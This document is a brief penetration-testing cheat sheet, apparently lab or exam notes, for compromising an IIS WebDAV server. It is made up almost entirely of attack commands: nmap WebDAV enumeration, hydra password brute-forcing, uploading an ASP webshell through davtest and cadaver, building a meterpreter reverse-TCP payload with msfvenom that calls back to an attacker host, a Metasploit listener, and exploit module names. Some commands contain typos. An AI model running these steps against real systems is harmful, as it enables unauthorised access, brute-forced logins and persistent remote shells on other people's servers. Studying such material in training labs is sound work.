# IIS Webdav
## nmap scripts
nmap 10.10.10.1 --script=http-webdavscan //should give back available webdav methods  
nmap 10.10.10.1 --script=http-enum //should give back /webdav/ folder  
## bruteforcing credentials
hydra -L users.txt -P passwords.txt 10.10.10.1 http-get /webdav/  
## davtest
davtest -url http://10.10.10.1/webdav/  
davtest -auth username:password -url http://10.10.10.1/webdav/  
## cadaver
cadaver http://10.10.10.1/webdav	(ask for username, password) (gives a shell like ftp)  
(inside cadaver shell)dav:/webdav/> put /usr/share/webshells/asp/webshell.asp  
## metasploit
### msfvenom reverse shell + msf listener
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.45 LPORT=1234 -f asp > shell.asp  
service postresql start && msfconsole  
use multi/handler  
set payload windows/meterpreter/reverse_tcp  
run  
### modules
epxloit/windows/iis/iis_webdav_upload_asp  (need credentials, and PATH)  
auxiliary/scanner/http/webdav_scanner  
auxiliary/scanner/http/webdav_website_content  
